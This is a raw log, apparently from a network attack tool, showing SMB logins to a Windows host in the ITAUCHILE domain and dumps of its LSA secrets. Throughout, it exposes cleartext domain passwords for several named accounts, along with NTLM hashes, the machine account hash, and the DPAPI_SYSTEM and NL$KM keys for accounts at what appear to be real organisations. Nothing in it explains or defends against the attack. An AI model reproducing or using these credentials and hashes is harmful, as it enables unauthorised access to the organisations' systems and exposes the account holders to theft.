12-22-2020 19:32:43 [*] L2CEA7F33F928.ITAUCHILE.CL:445 is running Windows 10.0 Build 18362 (name:L2CEA7F33F928) (domain:ITAUCHILE)
12-22-2020 19:32:44 [+] L2CEA7F33F928.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 19:32:50 [+] L2CEA7F33F928.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 19:32:56 CMGM9285:ba14971b735daddaaf9d5664a3cca234:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:32:57 CRFH4995QA:0431044a14d28af0ec3e97684f094ccf:corporativo.corpgroup.cl:CORPORATIVO:::
12-22-2020 19:32:59 CJDV9015QA:61d7ddfb3f51b56dc9473de32199c5f3:corporativo.corpgroup.cl:CORPORATIVO:::
12-22-2020 19:33:02 ITAUCHILE\L2CEA7F33F928$:aad3b435b51404eeaad3b435b51404ee:3c90cf8a524bc931b78b0f686c266a20:::
12-22-2020 19:33:05 DPAPI_SYSTEM:01000000fcadf90b435deb6e1f37d88788252ebf10445f27d105de92e1e0e2a88450cc996b915c9f99b777e8
12-22-2020 19:33:07 NL$KM:ae5e24fa6d6cd8e9f692b3723c066332908b62d344b4873ae933266f976d5ce116fb7699d95c38d57623c25fced4ef56ef50899120919ce754d1cf7a682bad54
12-22-2020 22:48:21 [*] L2CEA7F33F928.ITAUCHILE.CL:445 is running Windows 10.0 Build 18362 (name:L2CEA7F33F928) (domain:ITAUCHILE)
12-22-2020 22:48:22 [+] L2CEA7F33F928.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 22:48:28 [+] L2CEA7F33F928.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 22:48:34 CMGM9285:ba14971b735daddaaf9d5664a3cca234:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 22:48:36 CRFH4995QA:0431044a14d28af0ec3e97684f094ccf:corporativo.corpgroup.cl:CORPORATIVO:::
12-22-2020 22:48:38 CJDV9015QA:61d7ddfb3f51b56dc9473de32199c5f3:corporativo.corpgroup.cl:CORPORATIVO:::
12-22-2020 22:48:41 ITAUCHILE\L2CEA7F33F928$:aad3b435b51404eeaad3b435b51404ee:3c90cf8a524bc931b78b0f686c266a20:::
12-22-2020 22:48:45 DPAPI_SYSTEM:01000000fcadf90b435deb6e1f37d88788252ebf10445f27d105de92e1e0e2a88450cc996b915c9f99b777e8
12-22-2020 22:48:46 NL$KM:ae5e24fa6d6cd8e9f692b3723c066332908b62d344b4873ae933266f976d5ce116fb7699d95c38d57623c25fced4ef56ef50899120919ce754d1cf7a682bad54
12-22-2020 23:12:03 [*] L2CEA7F33F928.ITAUCHILE.CL:445 is running Windows 10.0 Build 18362 (name:L2CEA7F33F928) (domain:ITAUCHILE)
12-22-2020 23:12:04 [+] L2CEA7F33F928.ITAUCHILE.CL:445 Login successful ITAUCHILE\cicadmin30:ITAU2018!
